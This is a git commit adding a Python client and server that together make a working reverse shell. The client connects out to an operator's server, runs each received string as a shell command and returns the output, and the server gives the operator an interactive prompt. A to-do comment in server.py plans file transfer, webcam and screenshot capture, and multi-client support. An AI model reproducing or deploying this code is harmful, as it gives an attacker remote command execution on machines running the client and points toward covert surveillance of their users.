ee03c0c8692ea34acf0e0306438d0bfecb5170a9
Himanshu Bag <40608377+hb10001@users.noreply.github.com>
2019-10-02 15:03:35 +0530

    Add files via upload

---
+++ client.py
@@ -0,0 +1,48 @@
+import socket
+import sys, subprocess,os
+
+if(len(sys.argv[1:])!=2):
+    print("[!] Invalid input try again. ")
+    print("Usage:- python3 client.py <server_ip> <port_no>")
+    sys.exit()
+
+host,port = str(sys.argv[1]),int(sys.argv[2])
+
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    print('[*] Socket Initialized !!!'+'\n')
+    # To prevent,
+    # OSError: [Errno 98] Address already in use
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+except socket.error as e:
+    print('[!] Unable to initiate socket !!')
+    print('[!] ERROR :',str(e))
+    sys.exit()
+
+try:
+    s.connect((host,port))
+except socket.error as e:
+    print('[!] Unable to connect to Server !!.' + str(e))
+
+while True:
+    r= s.recv(1024)
+    out_str=''
+    if(r[:].decode("utf-8") == 'end shell'):
+        break
+    if r[:2].decode("utf-8") == 'cd':
+        try:
+            os.chdir(r[3:].decode("utf-8"))
+        except:
+            s.send(str.encode('! No such file or directory !'+'\n'+host+' @ ['+str(os.getcwd())+']'))
+    if(len(r)>0):
+        cmd = subprocess.Popen(r[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
+                                stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+        
+        out_bytes = cmd.stdout.read() +cmd.stderr.read()
+        out_str += str(out_bytes,"utf-8")
+        s.send(str.encode(out_str+'\n'+host+'@['+str(os.getcwd())+']'))
+    
+    
+
+s.close()
---
+++ server.py
@@ -0,0 +1,85 @@
+import socket
+import sys
+
+if(len(sys.argv[1:])!=1):
+    print("[!] invalid input. Try again.")
+    print("Usage:- python3 server.py <port_no>")
+    sys.exit()
+
+host,port = '127.0.0.1',int(sys.argv[1])
+try:
+    global s
+    print('[*] Socket Initializing..... ',end='')
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # To prevent,OSError: [Errno 98] Address already in use
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    print('Success')
+
+except socket.error as e:
+    print('[!] Unable to initiate socket !!')
+    print('[!] ERROR :',str(e))
+    sys.exit()
+
+
+def send_commands(con,ad):
+    while True:
+        cmd= input('~> ')
+        if (cmd=='quit'):
+            con.close()
+            s.close()
+            sys.exit()
+        if(len(str.encode(cmd))>0):
+            try:
+                con.send(str.encode(cmd))
+                result=str(con.recv(1024),"utf-8")
+                print(result,end=" ")
+            except Exception as e:
+                print(e)
+
+def bind_socket(host,port):
+    try:
+        print('[*] Binding Socket with Port {} ....'.format(port),end='')
+        s.bind((host,port))
+        s.listen(5)
+        print('Success '+'\n')
+        print('[*] Waiting for Connections......'+ '\n')
+    except socket.error as m:
+        print('[!] Error in Binding socket :: ',str(m))
+        x=input('[?] Do you want to retry? (Y/n)')
+        if(x=='Y' or x=='y'):
+            bind_socket(host,port)
+
+
+
+print('\n')
+bind_socket(host,port)
+ 
+con,ad = s.accept()
+print('-'*80)
+print('[*] Connected To IP : {0} | Port : {1}'.format(ad[0],ad[1])+'\n')
+send_commands(con,ad)
+con.close()
+
+
+
+
+'''
+
+To do :-
+   1.) Banner 
+   2.) transfer of file
+   3.) test for web cam & screen shot and then download them (option 2)
+   4.) multiple client
+   5.) handle broken pipes
+   6.) enhance the user experience
+
+   intution: 1.) can i get the clients env. detail (win /mac/ linux) by python cmds?
+
+'''
+
+
+
+
+
+
+
